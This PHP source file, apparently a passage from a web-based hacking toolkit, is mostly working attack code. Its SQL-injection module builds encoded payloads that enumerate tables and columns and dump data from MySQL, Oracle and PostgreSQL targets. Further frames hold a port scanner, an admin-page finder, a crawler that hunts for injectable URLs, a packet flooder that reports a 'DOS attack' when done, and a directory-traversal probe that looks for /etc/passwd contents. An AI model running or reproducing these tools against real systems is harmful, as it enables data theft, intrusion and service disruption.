            $querys   = str_replace("%23", "%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20$database%23", $querys);
        } elseif ($_POST['tablas'] == 'tables o-eb') {
            $mode      = "oracle_error";
            $query     = $c[$vuln_index - 1];
            $database2 = CHRize($database);
            $querys = str_replace("$payload_oracle", "(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(COUNT(TABLE_NAME)%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20SYS.ALL_TABLES%20WHERE%20OWNER%20IN%20(" . $database2 . "))%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))", $query);
        } elseif ($_POST['tablas'] == 'tables pg') {
            $mode   = "postgre_error";
            $query  = $d[$vuln_index - 1];
            $querys = str_replace("$payload_postgre", "(SELECT%20COALESCE(CAST(COUNT(tablename)%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20pg_tables%20WHERE%20schemaname%20IN%20((CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))))", $query);
        }
        echo "
			<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=4\" target=\"frame4\" method=\"post\" name=\"columnas\" id=\"columnas\">
			<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url\"/>
			<input type=\"hidden\" name=\"sobras\" id=\"sobras\" value=\"$sobras\"/>
			<select name=\"nombre\" id=\"nombre\">";
        if ($mode == "mysql_error") {
            $query_n    = str_replace("$payload_error", '(SELECT%207288%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(table_name%20AS%20CHAR),0x20)),1,50)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20' . $database . '%20LIMIT%20$i,1),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)', $query);
            $i          = 0;
            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $columnasss = "columns e-b";
            
        } elseif ($mode == "mysql_union") {
            $query_n    = str_replace("%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20DATABASE()", "%23", $query);
            $query_n    = str_replace("CONCAT(0x3a6f79753a,0x4244764877697569706b,0x3a70687a3a)", '(SELECT%20CONCAT(0x3a6f79753a,IFnull(CAST(table_name%20AS%20CHAR),0x20),0x3a70687a3a)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20%3D%20' . $database . '%20LIMIT%20$i,1)', $query_n);
            $i          = 0;
            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $columnasss = "columns u-q";
        } elseif ($mode == "oracle_error") {
            $query_n = str_replace("$payload_oracle", '(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(TABLE_NAME%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20(SELECT%20TABLE_NAME%2CROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_TABLES%20WHERE%20OWNER%20IN%20(' . $database2 . ')%20ORDER%20BY%201%20ASC)%20WHERE%20LIMIT%3D$i)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))', $query);
            
            $i          = 1;
            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)));
            $columnasss = "columns o-eb";
        } elseif ($mode == "postgre_error") {
            $query_n    = str_replace("$payload_postgre", '(SELECT%20COALESCE(CAST(tablename%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20pg_tables%20WHERE%20schemaname%20IN%20((CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)))%20OFFSET%20$i%20LIMIT%201)', $query);
            $i          = 0;
            $count      = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $columnasss = "columns pg";
        }
        print $count;
        while ($i <= $count) {
            $query_nombre = str_replace('$i', "$i", $query_n);
            $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
            echo "<option value=\"" . hexEncode($nombre) . "\">$nombre</option>";
            $i++;
        }
        
        echo "</select>
			<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$vuln_index\"/>
			<input type=\"submit\" name=\"columnas\" id=\"columnas\" value=\"$columnasss\"/>
			<input type=\"hidden\" name=\"database\" id=\"database\" value=\"$database\"/>
			</form>";
    }
}

function frame4()
{
    html_header();
    global $a, $payload_error, $b, $payload_union, $databas, $c, $payload_oracle, $d, $payload_postgre;
    if (isset($_POST['columnas'])) {
        $url        = $_POST["url"];
        $table_n    = $_POST['nombre'];
        $database   = $_POST['database'];
        $vuln_index = $_POST["lol"];
        $sobras     = $_POST['sobras'];
        $tabla      = asciiEncode($table_n);
        if ($_POST['columnas'] == 'columns e-b') {
            $mode   = "mysql_error";
            $query  = $a[$vuln_index - 1];
            $querys = str_replace("$payload_error", "(SELECT+1906+FROM(SELECT+COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT+MID((IFnull(CAST(COUNT(%2A)+AS+CHAR),0x20)),1,50)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name%3D$table_n+AND+table_schema%3D" . $database . "),0x3a70687a3a,floor(rand(0)%2A2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)", $query);
        } elseif ($_POST['columnas'] == 'columns u-q') {
            $mode   = "mysql_union";
            $query  = $b[$vuln_index - 1];
            $querys = str_replace("$payload_union", "CONCAT(0x3a6f79753a,IFnull(CAST(COUNT(*)%20AS%20CHAR),0x20),0x3a70687a3a)", $query);
            $querys = str_replace("%23", "%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D" . $table_n . "%20AND%20table_schema%3D" . $database . "%23", $querys);
        } elseif ($_POST['columnas'] == 'columns o-eb') {
            $mode     = "oracle_error";
            $query    = $c[$vuln_index - 1];
            $table_n  = asciiEncode($table_n);
            $table_n3 = CHRize($table_n);
            $querys   = str_replace("$payload_oracle", "(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(COUNT(*)%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20SYS.ALL_TAB_COLUMNS%20WHERE%20TABLE_NAME%3D" . $table_n3 . ")%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))", $query);
        } elseif ($_POST['columnas'] == 'columns pg') {
            $mode     = "postgre_error";
            $query    = $d[$vuln_index - 1];
            $table_n  = asciiEncode($table_n);
            $table_n3 = CHRize($table_n);
            $querys   = str_replace("$payload_postgre", "(SELECT%20COALESCE(CAST(COUNT(*)%20AS%20CHARACTER(10000))%2C(CHR(32)))%20FROM%20pg_namespace,pg_type,pg_attribute%20b%20JOIN%20pg_class%20a%20ON%20a.oid%3Db.attrelid%20WHERE%20a.relnamespace%3Dpg_namespace.oid%20AND%20pg_type.oid%3Db.atttypid%20AND%20attnum>0%20AND%20a.relname%3D(" . $table_n3 . ")%20AND%20nspname%3D(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)))", $query);
        }
        echo "
				<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=15\" target=\"_blank\" method=\"post\" name=\"datos\" id=\"datos\">
				<input type=\"hidden\" name=\"url\" id=\"url\" value=\"$url\"/>
					<input type=\"hidden\" name=\"sobras\" id=\"sobras\" value=\"$sobras\"/>
					<input type=\"hidden\" name=\"database\" id=\"database\" value=\"$database\"/>
				<input type=\"hidden\" name=\"tn\" id=\"tn\" value=\"$tabla\"/>
				";
        if ($mode == "mysql_error") {
            $query_n = str_replace("$payload_error", '(SELECT%205724%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(column_name%20AS%20CHAR),0x20)),1,50)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D' . $table_n . '%20AND%20table_schema%3D' . $database . '%20LIMIT%20$i,1),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)', $query);
            $i       = 0;
            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $datos   = "data e-b";
            
        } elseif ($mode == "mysql_union") {
            $query_n = str_replace("$payload_union", '(SELECT%20CONCAT(0x3a6f79753a,IFnull(CAST(column_name%20AS%20CHAR),0x20),0x3a70687a3a)%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D' . $table_n . '%20AND%20table_schema%3D' . $database . '%20LIMIT%20$i,1)', $query);
            $i       = 0;
            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $datos   = "data u-q";
        } elseif ($mode == "oracle_error") {
            $query_n = str_replace("$payload_oracle", '(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(COLUMN_NAME%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20(SELECT%20COLUMN_NAME%2CDATA_TYPE%2CROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_TAB_COLUMNS%20WHERE%20TABLE_NAME%3D' . $table_n3 . '%20ORDER%20BY%201%20ASC)%20WHERE%20LIMIT%3D$i)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))', $query);
            $i       = 1;
            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)));
            $datos   = "data o-eb";
        } elseif ($mode == "postgre_error") {
            $query_n = str_replace("$payload_postgre", '(SELECT%20COALESCE(CAST(attname%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20pg_namespace,pg_type,pg_attribute%20b%20JOIN%20pg_class%20a%20ON%20a.oid%3Db.attrelid%20WHERE%20a.relnamespace%3Dpg_namespace.oid%20AND%20pg_type.oid%3Db.atttypid%20AND%20attnum%3E0%20AND%20a.relname%3D(' . $table_n3 . ')%20AND%20nspname%3D(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))%20OFFSET%20$i%20LIMIT%201)', $query);
            $i       = 0;
            $count   = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
            $datos   = "data pg";
        }
        while ($i <= $count) {
            $query_nombre = str_replace('$i', "$i", $query_n);
            $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
            echo "<input type=\"checkbox\" name=\"nombre[]\" id=\"nombre\" value=\"" . hexEncode($nombre) . "\">$nombre</input><br>";
            $i++;
        }
        echo "<input type=\"hidden\" name=\"lol\" id=\"lol\" value=\"$vuln_index\"/>";
        echo "<input type=\"submit\" name=\"datos\" id=\"datos\" value=\"$datos\"/>";
        echo "</form>";
    }
}

function frame6()
{
    html_header();
    global $string3;
    global $action, $detectar_t;
    global $a, $payload_error, $b, $payload_union, $c, $payload_oracle, $d, $payload_postgre;
    if (isset($_POST['datos'])) {
        $url        = $_POST["url"];
        $vuln_index = $_POST["lol"];
        $sobras     = $_POST['sobras'];
        $nombre     = $_POST['nombre'];
        $database   = $_POST['database'];
        $tabla      = $_POST['tn'];
        if (is_array($_POST['nombre']) == true) {
            foreach ($_POST['nombre'] as $nombres) {
                echo "<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"display: inline-block;vertical-align: top;\"><tr>";
                echo "<td>" . asciiEncode($nombres) . "</td>";
                if ($_POST['datos'] == 'data e-b') {
                    $mode   = "mysql_error";
                    $query  = $a[$vuln_index - 1];
                    $querys = str_replace("$payload_error", "(SELECT%207656%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(COUNT(%2A)%20AS%20CHAR),0x20)),1,50)%20FROM%20" . asciiEncode($database) . "." . $tabla . "),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)", $query);
                } elseif ($_POST['datos'] == 'data u-q') {
                    $mode   = "mysql_union";
                    $query  = $b[$vuln_index - 1];
                    $querys = str_replace("$payload_union", "CONCAT(0x3a6f79753a,IFnull(CAST(COUNT(%2A)%20AS%20CHAR),0x20),0x3a70687a3a)", $query);
                    $querys = str_replace("%23", "%20FROM%20" . asciiEncode($database) . "." . $tabla . "%23", $querys);
                } elseif ($_POST['datos'] == 'data o-eb') {
                    $mode   = "oracle_error";
                    $query  = $c[$vuln_index - 1];
                    $querys = str_replace("$payload_oracle", "(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20COUNT(" . asciiEncode($nombres) . ")%20FROM%20" . $database . "." . $tabla . ")%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))", $query);
                } elseif ($_POST['datos'] == 'data pg') {
                    $mode   = "postgre_error";
                    $query  = $d[$vuln_index - 1];
                    $querys = str_replace("$payload_postgre", "(SELECT%20COALESCE(CAST(COUNT(%2A)%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20public." . $tabla . ")", $query);
                }
                if ($mode == "mysql_error") {
                    $queryn = str_replace("$payload_error", '(SELECT%206968%20FROM(SELECT%20COUNT(%2A),CONCAT(0x3a6f79753a,(SELECT%20MID((IFnull(CAST(' . asciiEncode($nombres) . '%20AS%20CHAR),0x20)),1,50)%20FROM%20' . asciiEncode($database) . '.' . $tabla . '%20LIMIT%20$i,1),0x3a70687a3a,floor(rand(0)%2A2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)', $query);
                    $i      = 0;
                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                } elseif ($mode == "mysql_union") {
                    $queryn = str_replace("$payload_union", '(SELECT%20CONCAT(0x3a6f79753a,IFnull(CAST(' . asciiEncode($nombres) . '%20AS%20CHAR),0x20),0x3a70687a3a)%20FROM%20' . asciiEncode($database) . '.' . $tabla . '%20LIMIT%20$i,1)', $query);
                    $i      = 0;
                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                } elseif ($mode == "oracle_error") {
                    $queryn = str_replace("$payload_oracle", '(REPLACE(REPLACE(REPLACE(REPLACE((SELECT%20NVL(CAST(' . asciiEncode($nombres) . '%20AS%20VARCHAR(4000))%2CCHR(32))%20FROM%20(SELECT%20' . asciiEncode($nombres) . '%2CROWNUM%20AS%20LIMIT%20FROM%20' . $database . '.' . $tabla . '%20ORDER%20BY%201%20ASC)%20WHERE%20LIMIT%3D$i)%2CCHR(32)%2CCHR(58)||CHR(121)||CHR(58))%2CCHR(36)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(64)%2CCHR(58)||CHR(109)||CHR(58))%2CCHR(35)%2CCHR(58)||CHR(102)||CHR(58)))', $query);
                    $i      = 0;
                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                    
                } elseif ($mode == "postgre_error") {
                    $queryn = str_replace("$payload_postgre", '(SELECT%20COALESCE(CAST(' . asciiEncode($nombres) . '%20AS%20CHARACTER(10000)),(CHR(32)))%20FROM%20public.' . $tabla . '%20OFFSET%20$i%20LIMIT%201)', $query);
                    $i      = 0;
                    $count  = (GetBetween(get_url($url . $querys . $sobras,$proxy)) - 1);
                    
                }
                echo "</tr>";
                while ($i <= $count) {
                    
                    $query_nombre = str_replace('$i', "$i", $queryn);
                    $nombre       = GetBetween(get_url($url . $query_nombre . $sobras,$proxy));
                    echo "<tr><td>" . $nombre . "</td>";
                    $i++;
                }
            }
            echo "</tr></table>";
        }
    }
}
function frame5()
{
    frameset();
}
///////PHPsic ends------------------------------------------------------------
///////PHPps starts--------------------------------------------------------------
function PHPps_frame()
{
    global $action;
    html_header();
    
    echo "<body>\n
		<div align=left><h1>PHPps</h1></div><br><br>
		<br>Paste the server IP/Address (in x.x.x.x or www.example.com format) and the port range.<br><br> <br> 
		<table><tr><td>
		<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=10\" method=\"post\" name=\"ports\" id=\"ports\">
		IP/Host: <input type=\"text\" name=\"url\" id=\"url\" size=\"65\" /><br>
		Port Range: <input type=\"text\" name=\"primero\" id=\"primero\" size=\"15\"/><input type=\"text\" name=\"ultimo\" id=\"ultimo\" size=\"15\"/>
		<input type=\"submit\" name=\"ports\" id=\"ports\" value=\"scan\"/><br>
		</form> 
		";
    if (isset($_POST['ports']) && $_POST['ports'] == 'scan') {
        $url     = $_POST['url'];
        $primero = $_POST['primero'];
        $ultim   = ($_POST['ultimo'] + 1);
        for ($port = $primero; $port != $ultim; $port++) {
            $conect = @fsockopen($url, $port, $errno, $errstr, 5);
            if ($conect) {
                echo ("Port " . $port . " is  <font color='green'>open</font><br/>");
                fclose($conect);
                unset($conect);
            } else {
            }
            flush();
        }
    }
    echo "</body>\n</html>";
}
///////PHPps ends--------------------------------------------------------------
///////PHPapf starts--------------------------------------------------------------
function PHPapf_frame()
{
    global $action, $ap;
    html_header();
    echo "<body>\n
		<div align=left><h1>PHPapf</h1></div><br><br>
		<br>Thing is simple, just enter the url (http://www.example.com/) and WAIT.<br><br><br> 
		<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=11\" method=\"post\" name=\"ports\" id=\"ports\">
		URL: <input type=\"text\" name=\"url\" id=\"url\" size=\"65\" value=\"http://\"/>    <input type=\"submit\" name=\"ports\" id=\"ports\" value=\"scan\"/><br>
		</form> 
		";
    if (isset($_POST['ports']) && $_POST['ports'] == 'scan') {
        $url = $_POST['url'];
        function get_http_response_code($theURL)
        {
            $headers  = get_headers($theURL);
            $status   = substr($headers[0], 9, 3);
            
            if ($status == 200 or $status == 403) {
                return "found <a href=\"$theURL\">$theURL</a> | status: $status<br>";
            } elseif ($status == 500) {
                return "<font color=\"red\">($status)INTERNAL SERVER ERROR</font><a href=\"$theURL\">CHECK</a><br>";
            } elseif ($status != 500 and $status != 200 and $status != 403) {
			     return "<font color=\"red\">ABNORMAL ERROR CODE OR SERVER STATUS FOUND <a href=\"$theURL\">$theURL</a></font><br>";
            }
        }
        foreach ($ap as $url2) {
            $url3 = $url.$url2;
            echo get_http_response_code($url3);
        }
    }
    echo "</body>\n</html>";
}
///////PHPapf ends------------------------------------------------------------
///////PHPswc ends------------------------------------------------------------
function phpswc_frame()
{
    global $action,$proxy;
    html_header();
    $proxy=0;
    ini_set('memory_limit', '-1');
    echo "<body>\n
		<div align=left><h1>PHPswc</h1></div><br><br>
		<br>Enter the url (http://www.example.com WITHOUT A FINAL /) and WAIT A LOT (like 2 mins or so).<br>
		This will give some possible vulnerable urls like http://www.example.com?vuln=erability<br><br><br> 
		<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=12\" method=\"post\" name=\"crawl\" id=\"crawl\">
		URL: <input type=\"text\" name=\"url\" id=\"url\" size=\"65\" value=\"http://\"/> <br>
		Max. level 2 links to crawl: <input type=\"text\" name=\"links\" id=\"links\" size=\"35\" value=\"50\"/> <input type=\"submit\" name=\"crawl\" id=\"crawl\" value=\"crawl\"/><br>
		(According to... myself, 50 is a cool max. number)
		<br>
		</form> 
		";
    if (isset($_POST['crawl']) && $_POST['crawl'] == 'crawl') {
        function getTime()
        {
            $a = explode(' ', microtime());
            return (double) $a[0] + $a[1];
        }
        //$Start = getTime();
        $link_to_dig   = $_POST['url'];
        $maxlinks      = $_POST['links'];
        $original_file = @get_url($link_to_dig,$proxy);
        $path_info     = parse_url($link_to_dig);
        $base          = $path_info['scheme'] . "://" . $path_info['host'];
        $stripped_file = strip_tags($original_file, "<a>");
        $fixed_file    = preg_replace("/<a([^>]*)href=\"\//is", "<a$1href=\"{$base}/", $stripped_file);
        $fixed_file    = preg_replace("/<a([^>]*)href=\"\?/is", "<a$1href=\"{$link_to_dig}/?", $fixed_file);
        preg_match_all("/<a(?:[^>]*)href=\"([^\"]*)\"(?:[^>]*)>(?:[^<]*)<\/a>/is", $fixed_file, $matches);
        $result = $matches[1];
        $result = str_replace("<", "&lt;", $result);
        $p      = parse_url($link_to_dig);
        $host   = $p['host'];
        foreach ($result as $sresult) {
            if (((strpos($sresult, "facebook"))) == false && ((strpos($sresult, "javascript"))) == false && ((strpos($sresult, "twitter"))) == false && ((strpos($sresult, "youtube"))) == false) {
                $items[] = $sresult;
                
            }
        }
        $result = array_unique($items);
        foreach ($result as $checker) {
            $checker = str_replace(" ", "", $checker);
            if (strpos($checker, "://") == NULL) {
                $final[] = "http://" . $host . "/$checker";
                
            } elseif (strpos($checker, $host) == FALSE) {
            } else {
                $final[] = $checker;
            }
        }
        $maxlonks = "0";
        foreach ($final as $echo) {
            $maxlonks++;
            if ($maxlonks >= $maxlinks) {
                break;
            }
            $original_file2 = @get_url($echo,$proxy);
            $path_info2     = parse_url($echo);
            $base2          = $path_info2['scheme'] . "://" . $path_info2['host'];
            $stripped_file2 = strip_tags($original_file2, "<a>");
            $fixed_file2    = preg_replace("/<a([^>]*)href=\"\//is", "<a$1href=\"{$base2}/", $stripped_file2);
            $fixed_file2    = preg_replace("/<a([^>]*)href=\"\?/is", "<a$1href=\"{$echo}/?", $fixed_file2);
            preg_match_all("/<a(?:[^>]*)href=\"([^\"]*)\"(?:[^>]*)>(?:[^<]*)<\/a>/is", $fixed_file2, $matches2);
            $result2 = $matches2[1];
            $result2 = str_replace("<", "&lt;", $result2);
            $p2      = parse_url($echo);
            $host2   = $p2['host'];
            foreach ($result2 as $sresult2) {
                if (((strpos($sresult2, "php?"))) == true && ((strpos($sresult2, "facebook"))) == false && ((strpos($sresult2, "javascript"))) == false && ((strpos($sresult2, "twitter"))) == false && ((strpos($sresult2, "youtube"))) == false) {
                    $items2[] = $sresult2;
                }
            }
        }
        $resultados = array_unique($items2);
        foreach ($resultados as $checker2) {
            $checker2 = str_replace(" ", "", $checker2);
            if (strpos($checker2, "://") == NULL) {
                $final2[] = "http://" . $host . "/$checker2";
            } elseif (strpos($checker2, $host2) == FALSE) {
            } else {
                $final2[] = $checker2;
            }
        }
    }
    $uniques = array_unique(array_merge($final, $final2));
    foreach ($uniques as $quizas) {
        if (((strpos($quizas, "?"))) == true && ((strpos($quizas, "facebook"))) == false && ((strpos($quizas, "javascript"))) == false && ((strpos($quizas, "twitter"))) == false && ((strpos($quizas, "youtube"))) == false) {
            $items[] = $quizas;
            echo "$quizas<br>";
        }
    }
}
///////PHPswc ends------------------------------------------------------------
//////PHPfzz
function PHPfuz_frame()
{
    global $action;
    html_header();
    echo "
		<body>\n
		<div align=left><h1>PHPssf</h1></div><br><br>
		<br>1.- Enter Host/IP:port<br>2.- Click GO<br>3.- ?????<br>4.- PROFIT!!<br><br>
		<form method=\"POST\" name=\"fuzz\" action=\"" . $_SERVER['PHP_SELF'] . "?frame=13\">
		<input type=\"hidden\" name=\"fuzz\" />
		<input type=\"hidden\" name=\"type\"value=\"tcp\" />
		Host/IP: <input class=\"cmd\" name=\"ip\" value=\"127.0.0.1\" />   
		Port: <input class=\"cmd\" name=\"port\" value=\"80\" /><br>
		Timeout: <input type=\"text\" class=\"cmd\" name=\"time\" value=\"5\"/>
		Packages to send: <input type=\"text\" class=\"cmd\" name=\"times\" value=\"100\" /><br>
		Message: <font color=\"red\">(The message MUST be long)</font>
		<input class=\"cmd\" name=\"message\" value=\"%S%x--Some Garbage here--%x%S\" />
		Times to repeat message: <input style=\"width: 30px;\" class=\"cmd\" name=\"Multiplier\" value=\"10\" /><br>
		<input type=\"submit\" class=\"own\" value=\"GO\" name=\"fuzz\"/>
		</form>";
    if (isset($_POST['fuzz']) && $_POST['fuzz'] == 'GO') {
        if (isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['times']) && isset($_POST['time']) && isset($_POST['message']) && isset($_POST['Multiplier']) && $_POST['message'] != "" && $_POST['time'] != "" && $_POST['times'] != "" && $_POST['port'] != "" && $_POST['ip'] != "" && $_POST['Multiplier'] != "") {
            $IP         = $_POST['ip'];
            $port       = $_POST['port'];
            $times      = $_POST['times'];
            $timeout    = $_POST['time'];
            $send       = 0;
            $ending     = "";
            $multiplier = $_POST['Multiplier'];
            $data       = "";
            $mode       = "tcp";
            $data .= "POST /";
            $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
            if ($_POST['type'] == "tcp") {
                $mode = "tcp";
            }
            while ($multiplier--) {
                $data .= urlencode($_POST['message']);
            }
            $data .= "%s%s%s%s%d%x%c%n%n%n%n"; // add some format string specifiers
            $data .= "server beign fuzzed, resistance is futile!" . $ending;
            $length = strlen($data);
            for ($i = 0; $i < $times; $i++) {
                $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
                if ($socket) {
                    fwrite($socket, $data, $length);
                    fclose($socket);
                }
            }
            echo "Fuzzing Completed!<br>	";
            echo "DOS attack against $mode://$IP:$port completed on " . date("h:i:s A") . "<br />";
            echo "Total Number of Packets Sent : " . $times . "<br />";
        }
    }
}
/////PHPfuz end
/////PHPdt
function PHPdt_frame()
{
    global $action, $dt,$proxy;
    html_header();
    $proxy = 0;
    echo "<body>\n
	<div align=left><h1>PHPdt</h1></div><br><br>
	<br>Thing is simple, just enter the url (http://www.example.com/lol.php?file=some/shit.php) and WAIT.<br><br><br> 
	<table><tr><td>
	<form action=\"" . $_SERVER['PHP_SELF'] . "?frame=14\" method=\"post\" name=\"ports\" id=\"ports\">
	URL: <input type=\"text\" name=\"url\" id=\"url\" size=\"65\" value=\"http://\"/>    <input type=\"submit\" name=\"ports\" id=\"ports\" value=\"scan\"/><br>
	</form> 
	";
	
    if (isset($_POST['ports']) && $_POST['ports'] == 'scan') {
        $url = $_POST['url'];
        $a = explode("=", $url);
        $b = 0;
        while (count($a) - 2 >= $b) {
            @$c .= $a[$b]."=";
            $b++;
        }
        echo "<br><br><br>";
        foreach ($dt as $url2) {
            $traversal  = $c.$url2;
            $resultadox = @get_url($traversal,$proxy);
            if (strpos($resultadox, "root:x:")) {
                echo "<font color=red>Directory Traversal found:</font> " . $traversal . "<br>";
                $status = "1";
                die();
            }
        }
        if (@$status !== "1") {
            echo "NOTHING TO DO HERE...";
        }
    }
    echo "</body>\n</html>";
}
///////PHPdt starts--------------------------------------------------------------
echo "</body>";
?>
